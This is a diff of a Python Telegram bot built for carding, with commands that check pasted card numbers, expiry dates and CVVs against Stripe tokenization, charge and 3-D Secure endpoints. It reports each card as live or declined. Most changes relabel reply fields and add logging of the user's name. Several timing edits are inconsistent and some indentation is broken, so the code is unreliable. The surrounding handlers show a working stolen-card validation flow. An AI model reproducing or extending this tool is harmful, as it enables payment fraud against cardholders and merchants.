@@ -10,6 +10,7 @@ import re
 import base64
 import json
 
+
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
@@ -72,7 +73,7 @@ async def helpstr(message: types.Message):
     MSG = f'''
 Hello {FIRST}, I'm bot
 BOSS:  <a href="tg://user?id={OWNER}">HERE</a>
-Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\nhận/vbv check vbv'''
+Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\n/vbv check vbv\n/c2d site 2ds'''
     await message.answer(MSG, reply_markup=keyboard_markup,
                         disable_web_page_preview=True)
 
@@ -89,6 +90,7 @@ async def info(message: types.Message):
         is_bot = message.from_user.is_bot
         username = message.from_user.username
         first = message.from_user.first_name
+        print("check by "+first)
     await message.reply(f'''
 ═════════╕
 <b>USER INFO</b>
@@ -113,7 +115,11 @@ async def binio(message: types.Message):
     r = requests.get(
                f'http://binchk-api.vercel.app/bin={BIN}'
     ).json()
-    INFO = f'''
+    
+    
+    print("check by "+FIRST)
+    
+     INFO = f'''
 BIN⇢ <code>{BIN}</code>
 Brand⇢ <u>{r["brand"]}</u>
 Type⇢ <u>{r["type"]}</u>
@@ -126,9 +132,9 @@ SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
 BOT⇢ @{BOT_USERNAME}
 OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
 '''
-    await message.reply(INFO)
-
-
+     await message.reply(INFO)
+    
+         
 @dp.message_handler(commands=['cv'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
     await message.answer_chat_action('typing')
@@ -147,7 +153,7 @@ async def ch(message: types.Message):
             cc = message.text[len('/cv '):]
 
         if len(cc) == 0:
-            return await message.reply("<b>No Card to cv</b>")
+            return await message.reply("<b>You have not filled in the card</b>")
 
         x = re.findall(r'\d+', cc)
         ccn = x[0]
@@ -159,8 +165,8 @@ async def ch(message: types.Message):
         if len(mm) >= 3:
             mm, yy, cvv = yy, cvv, mm
         if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
+                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
@@ -250,8 +256,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -264,8 +270,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -278,8 +284,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -291,8 +297,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -314,7 +320,7 @@ async def ch(message: types.Message):
             cc = message.text[len('/ck '):]
 
       if len(cc) == 0:
-            return await message.reply("<b>No Card to ck</b>")
+            return await message.reply("<b>You have not filled in the card</b>")
 
       x = re.findall(r'\d+', cc)
       ccn = x[0]
@@ -326,8 +332,8 @@ async def ch(message: types.Message):
       if len(mm) >= 3:
             mm, yy, cvv = yy, cvv, mm
       if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
+                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
       BIN = ccn[:6]
       if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
@@ -364,12 +370,13 @@ async def ch(message: types.Message):
             "accept-language": "en-US,en;q=0.9"
 
         }
-
+      print("check by "+FIRST)
       rx =  requests.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
       res = rx.json()
       LastF = f'************{ccn[-4:]}'
-      toc1 = time.perf_counter()
+      toc11 = time.perf_counter()
+      toc1 = toc11 - tic
       if 'declined' in rx.text:
             
             msg = res['error']['message']
@@ -377,8 +384,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -389,8 +396,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
       if 'Request rate limit exceeded.' in rx.text:
@@ -400,8 +407,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -412,8 +419,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
       if 'security code is invalid' in rx.text:
@@ -423,8 +430,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Security code is invalid.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
        
@@ -454,8 +461,9 @@ async def ch(message: types.Message):
         brand = card['brand']
         funding = card['funding']
 
-        toc2 = time.perf_counter()
-
+        toc22 = time.perf_counter()
+        toc2 = toc22 - tic + toc1
+        print("check by "+FIRST)
         if 'Payment complete' in ri.text:
 
             return await message.reply(f'''
@@ -466,8 +474,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -480,8 +488,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
         if 'Request rate limit exceeded.' in ri.text:
@@ -493,8 +501,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -507,8 +515,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -521,8 +529,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -535,8 +543,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -548,8 +556,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -571,7 +579,7 @@ async def ch(message: types.Message):
             cc = message.text[len('/ck '):]
 
       if len(cc) == 0:
-            return await message.reply("<b>No Card to ck</b>")
+            return await message.reply("<b>You have not filled in the card</b>")
 
       x = re.findall(r'\d+', cc)
       ccn = x[0]
@@ -583,8 +591,8 @@ async def ch(message: types.Message):
       if len(mm) >= 3:
             mm, yy, cvv = yy, cvv, mm
       if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
+                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
       BIN = ccn[:6]
       if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
@@ -634,8 +642,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -646,8 +654,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -658,8 +666,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -671,8 +679,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -714,8 +722,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -726,8 +734,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -738,8 +746,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -751,8 +759,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
         
@@ -777,7 +785,7 @@ async def ch(message: types.Message):
          toc31 = time.perf_counter()
          toc3 = toc31 - tic
          toc = toc1 + toc2 + toc3
-         
+         print("check by "+FIRST)
                          
          if 'Request rate limit exceeded.' in rc.text:
             
@@ -786,8 +794,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -796,16 +804,16 @@ async def ch(message: types.Message):
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ LIVE STRIPE
 <b>MSG</b>➟ cvc_check: "pass"
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
          if 'unavailable' in rc.text:
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>MSG</b>➟ cvc_check: "unavailable"
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -827,7 +835,7 @@ async def ch(message: types.Message):
             cc = message.text[len('/cv '):]
 
         if len(cc) == 0:
-            return await message.reply("<b>No Card to cv</b>")
+            return await message.reply("<b>You have not filled in the card</b>")
 
         x = re.findall(r'\d+', cc)
         ccn = x[0]
@@ -839,8 +847,8 @@ async def ch(message: types.Message):
         if len(mm) >= 3:
             mm, yy, cvv = yy, cvv, mm
         if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
+                                       '<b>𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓</b>')   
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
@@ -960,9 +968,8 @@ async def ch(message: types.Message):
                           headers=head3)
         toc31 = time.perf_counter()
         toc3 = toc31 - tic
-        
         toc = toc1 + toc2 + toc3
-        
+        print("check by "+FIRST)
         threeDSecureInfo = r4.json()['paymentMethod']['threeDSecureInfo']
         status = threeDSecureInfo['status']
 
@@ -975,8 +982,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -989,8 +996,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1003,8 +1010,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1017,8 +1024,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1031,8 +1038,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''') 
     
@@ -1045,8 +1052,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1059,8 +1066,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1073,8 +1080,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1087,8 +1094,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1101,8 +1108,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1115,8 +1122,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1129,8 +1136,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1143,8 +1150,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1166,7 +1173,7 @@ async def ch(message: types.Message):
             cc = message.text[len('/cv '):]
 
         if len(cc) == 0:
-            return await message.reply("<b>No Card to cv</b>")
